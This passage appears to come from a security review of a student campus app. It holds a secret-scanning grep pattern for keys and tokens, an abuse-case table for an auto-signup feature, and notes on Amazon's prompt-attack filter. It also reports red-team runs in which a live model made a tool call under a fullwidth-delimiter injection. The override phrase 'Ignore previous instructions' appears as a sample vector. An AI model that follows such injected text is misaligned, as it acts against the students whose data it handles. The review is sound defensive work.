   `grep -rInE "AKIA[0-9A-Z]{16}|aws_secret|BEGIN (RSA|EC|OPENSSH|PRIVATE)|adminKey|x-admin-key|ADMIN_KEY|xox[baprs]-|ghp_[A-Za-z0-9]{30,}|eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.|webcal://|\.ics\?|calendarFeed|[0-9]{12}" .`
3. Never commit: `cdk-outputs.json` (ignored), `cdk.context.json` (add to `.gitignore`: it caches account ids), `.env*`, `*.pem`, `*.key`, `mobile/.expo`, `*.tfstate`, anything under `scripts/` that holds real emails or a real Blackboard URL (`scripts/seed.py` uses fake data; check demo PDFs are fake).
4. Check git history, not just the tree: this is not a git repo yet. When `git init` happens, make the FIRST commit only after the scan passes, so no secret ever enters history. If one does, rotate it and rewrite history before pushing (rotating is mandatory either way).
5. Rotate before going public: the admin key (moot once removed), any test Cognito users with real emails (delete them), and confirm no real student syllabus or feed file is in the repo.
6. Remove or genericise real identifiers: account id `<account-id>`, personal email in any file, Luca's real feed file location.
7. `web/public/config.json`, `mobile/src/config.ts`: only public ids (pool, client, API URL). Fine. Do not add a Cognito client secret (clients here have none).
8. After the scan, run `python -I -m unittest discover backend/tests` and `python -I scripts/redteam.py` once more.

## 7. Auto-campus abuse review (AUTO_CAMPUS.md)

Design reviewed: registry-based pre-signup, lazy creation in `/me`, `/public/resolve`, suffix matching. Builder's registry and matching code (`lib/registry.py`, `pre_signup.py`, the `/me` change) had not landed when this was written; **a code review of it is pending** and will be logged when it appears. Checklist for that review is at the end of this section.

| Abuse case | Risk | Required control |
|---|---|---|
| Domain enumeration via `/public/resolve` | The endpoint answers "known or not" for any domain, so an attacker can map the registry and which campuses are live. The registry is public data, but live-campus status and student counts are not. | Return only `{found, name, theme}` for registry or live domains and nothing else (no counts, no created dates, no creator). Same response shape and status (200) for unknown domains. Per-IP limit via `limits.check_ip(table, ip, "resolve")` (add `"resolve": (30, 300)` to `IP_LIMITS`). Normalise and length-cap the input (255 chars, DNS label regex) before any lookup. |
| Verification email flooding against the Cognito 50/day cap | Anyone can start signup for arbitrary addresses at a registry domain, burning the daily cap (denial of service) and spamming third parties. | Production SES (support form), a per-IP throttle in front of signup (WAF rate rule on the Cognito IDP endpoint is not possible for the hosted API; instead route signup through a thin `POST /public/signup` Lambda that calls Cognito `SignUp` after `limits.check_ip(..., "signup")`, 3 per hour per IP; add `IP_LIMITS["signup"] = (3, 10)`), plus a per-email limit (hash the address, 3 per day). Keep demo accounts pre-created. Alarm on the Cognito `SignUpSuccesses` metric. |
| Signup spam for arbitrary school domains | A bot signs up `x@random-registered-domain.edu` to create junk campuses at scale. | Creation only after email verification (the spec does this). Add a global cap on auto-created campuses per day (for example 20; beyond that return a friendly "we'll add your school soon" and queue a request), and the per-IP signup limit above. Audit every auto-create with a hashed creator. |
| Race on first-signup campus creation | Two first signups for one domain create two campuses or overwrite one. | `put_item` with `ConditionExpression="attribute_not_exists(pk)"` on the tenant item and the `DOMAIN#` map items in ONE `transact_write_items` (Admin's `_create_tenant` already does this for the admin path; reuse it in `lib/`). On `TransactionCanceledException` re-read and use the winner. Tenant id = slug of the registry name, deterministic, so both racers target the same key. |
| Malicious school name rendered in the UI | Registry or admin-edited names, `shortName` and the user-submitted request `schoolName` appear in the UI, in prompts (tutor system prompt includes the campus name), in the calendar name, and in the admin UI. A name like `<img onerror>` or `Ignore previous instructions` is a stored XSS or injection vector. | Treat as untrusted text everywhere: validate on write (letters, digits, spaces and `.,&'()-` only, 2-120 chars, NFKC normalised, no control characters; use `guard.clean_text`), render as text nodes only (never HTML), and when it goes into a model prompt wrap it with `guard.wrap_untrusted("campus_name", name, nonce)`. Calendar: `guard.ical_text`. The Hipo dataset is third-party data: validate each entry at build time in `scripts/build_school_registry.py`, not at runtime. |
| Disabled or blocked domain bypass via subdomains | A blocked `x.edu` stays reachable as `mail.x.edu` or `x.edu.` or `X.EDU` or `x.edu` with a trailing dot or unicode look-alikes. | One normaliser used by pre-signup, `/me` and `/public/resolve` (never duplicated): lowercase, strip trailing dot, NFKC, IDNA-encode, reject if not ASCII after IDNA, reject any label that is not `[a-z0-9-]`. Match by DNS label boundary: the user's domain equals a registry domain or ends with `"." + registry_domain` (so `evilua.edu` does NOT match `ua.edu`). Longest match wins. Check the `blocked`/`disabled` flag on the matched campus AND on every suffix of the user's domain (a block on `x.edu` blocks all of its subdomains). Re-check the flag on every `/me`, not only at signup, so a disabled campus cannot continue with an old token. Free-mail list applies to the registry too (some datasets list `gmail.com`-like entries; drop them at build time). |
| Cross-campus data exposure by wrong match | Wrong campus means the student sees another school's listings and pickup spots. | Tenant id is bound to the profile at first `/me` and never recomputed from the email afterwards unless the admin changes it; test `ac.uk`, `edu.au`, `co.uk` registry-style cases. |
| Public resolve as an SSRF or injection surface | Domain strings go into DynamoDB keys. | Keys are built only from the normalised ASCII form; never pass raw input into a key or log line (`redact.safe`). |

Checklist for the pending code review of Builder's registry code: (1) one shared normaliser, no "last two labels"; (2) label-boundary suffix match with unit tests for `evilua.edu`, `ua.edu.evil.com`, `a.b.ac.uk`, trailing dot, uppercase, unicode; (3) pre-signup creates nothing and returns the same generic message for unknown, free-mail and blocked domains (no enumeration of which); (4) conditional transactional create; (5) `/me` accepts `tz` only if it is a valid IANA name (`ZoneInfo` check, length cap), else default; (6) registry JSON loaded once, size-capped, names validated; (7) `/public/resolve` limits and uniform responses; (8) disabled check on every `/me`.

## 8. Optional layer: Amazon Bedrock Guardrails (PROMPT_ATTACK filter)

Evaluated, not wired. The `ApplyGuardrail` API can screen untrusted text before it reaches the model; the `PROMPT_ATTACK` content filter detects jailbreak and prompt-injection attempts (it applies to inputs, and for it to work the untrusted text should be sent as the guard content, not mixed with your own instructions).
- **Cost** (pricing as last known; verify on the Bedrock pricing page): text content filters are billed per 1,000 text units (one unit is up to 1,000 characters), on the order of fractions of a cent per unit. A 60,000-character syllabus is about 60 units per call, so a few cents per hundred syllabi. Low for a demo, noticeable at scale.
- **Latency**: typically a few hundred milliseconds per call for short text, more for 60k characters (you would chunk). It adds to a pipeline that already waits 5-20 s on the model, so the cost in time is small for the async syllabus worker and visible but acceptable for chat.
- **Quality**: it catches blatant "ignore previous instructions" patterns; it will miss subtle, domain-specific, or multilingual injection, and it can false-positive on real syllabi that talk about AI policies or "ignore the previous reading". A guardrail verdict is a signal, not a boundary.
- **Is it worth it?** Not for the hackathon: our real protection is structural (nonce wrapping, no destructive tools, validated and user-scoped tool calls, sanitised output, CSP) and does not depend on detecting attacks. Worth adding later for the free-text surfaces that flow into tool-using agents (tutor chat, feed events, listings), in monitor mode first: log verdicts (without content) to learn the false-positive rate, then block. If wired, call it from one function in `lib/guard.py` (`guardrail_flags(text)`), fail open on errors, and never skip the structural controls.

## 9. Evidence

- `python -I -m unittest discover backend/tests`: 72 tests pass (guard, limits, redact, safe_fetch).
- `python -I scripts/redteam.py`: 55 offline checks pass (stub compromised model: all hostile tool calls rejected, no data changed, output sanitised, SSRF payloads blocked).
- `python -I scripts/redteam.py --live` (zai.glm-5, us-east-1, 14 calls): 13 of 14 runs were clean; 1 of 14 (fullwidth-delimiter attack, tools offered) made a tool call anyway. In production that call would hit `validate_tool_call`: the assignment id would need to be the student's own, so it would be rejected or become a visible action with undo. Real models do follow injected instructions sometimes, which is why the design never relies on the model behaving.

## 10. Known limits of this work

- None of the new modules are wired into the running app yet (see section 3); until they are, the live app has the findings in section 4.
- `safe_fetch`'s real transport (`_https_transport`) is not exercised against a live TLS server in tests (the tests use fakes by design). It pins the connection to the vetted IP and keeps TLS hostname verification; try one real feed URL after wiring.
- DNS resolution inside `safe_fetch` uses the system resolver without its own timeout; the overall Lambda timeout is the backstop.
- The sanitisers reduce risk, they do not prove safety. The UI rules and CSP are what make output handling robust.
